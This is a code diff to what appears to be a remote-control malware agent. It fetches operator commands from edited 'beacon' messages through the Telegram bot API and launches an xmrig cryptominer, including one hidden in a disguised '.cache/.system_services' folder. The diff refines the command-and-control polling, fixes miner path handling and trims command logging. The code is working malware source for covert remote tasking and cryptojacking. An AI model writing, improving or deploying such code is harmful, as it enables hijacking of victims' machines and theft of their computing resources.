@@ -175,41 +175,23 @@ def telegram_send(message: str, reply_to: int = None) -> dict:
         return {"ok": False, "error": str(e)}
 
 def telegram_get_commands_via_edit(agent_id: str, beacon_msg_id: int) -> list:
-    """Get commands from edited beacon message using getChat (not getUpdates).
+    """Get commands from edited beacon message.
     
-    Avoids 409 conflict by not using getUpdates.
-    Reads the message directly from chat history.
+    Uses short polling for edited_message updates.
     """
     commands = []
     
     try:
-        # Use getChat to read our message (not getUpdates)
-        # This avoids 409 conflict with bot's polling
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChat"
-        params = f"?chat_id={TELEGRAM_CHAT_ID}"
+        # Check for edits via getUpdates
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
+        params = f"?limit=3&timeout=0&allowed_updates=[\"edited_message\"]"
         
         req = Request(url + params, headers={"User-Agent": "Mozilla/5.0"})
-        resp = urlopen(req, timeout=5)
+        resp = urlopen(req, timeout=10)
         result = json.loads(resp.read().decode())
         
-        # Alternative: use forwardMessage trick to check message content
-        # Or use editMessageText to check if we can edit (means it exists)
-        
-        # Actually, read the specific message via copyMessage or check
-        # Best approach: just re-read our beacon after delay
-        
-        # Wait a bit then check for edits via getUpdates with short timeout
-        time.sleep(1)
-        
-        url2 = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-        params2 = f"?limit=5&timeout=0&allowed_updates=[\"edited_message\"]"
-        
-        req2 = Request(url2 + params2, headers={"User-Agent": "Mozilla/5.0"})
-        resp2 = urlopen(req2, timeout=3)
-        result2 = json.loads(resp2.read().decode())
-        
-        if result2.get("ok"):
-            for update in result2.get("result", []):
+        if result.get("ok"):
+            for update in result.get("result", []):
                 msg = update.get("edited_message")
                 if not msg:
                     continue
@@ -230,10 +212,10 @@ def telegram_get_commands_via_edit(agent_id: str, beacon_msg_id: int) -> list:
                                 "type": match.group(2),
                                 "command": match.group(3)
                             })
-                            log(f"Got command: #{match.group(1)} {match.group(3)[:30]}", "TASK")
+                            log(f"Got command: #{match.group(1)}", "TASK")
                         
     except Exception as e:
-        if "409" not in str(e):
+        if "409" not in str(e) and "timed out" not in str(e):
             log(f"Get commands error: {e}", "DEBUG")
     
     return commands
@@ -404,7 +386,7 @@ def start_mining(config: str = None) -> str:
             
             # Check for xmrig
             xmrig_paths = [
-                Path.home() / ".cache" / ".system_services" / "xmrig",
+                str(Path.home() / ".cache" / ".system_services" / "xmrig"),
                 "/opt/miner/xmrig",
                 "/usr/local/bin/xmrig",
                 "/tmp/xmrig"
@@ -412,7 +394,7 @@ def start_mining(config: str = None) -> str:
             
             xmrig = None
             for path in xmrig_paths:
-                if path.exists():
+                if Path(path).exists():
                     xmrig = str(path)
                     break
             
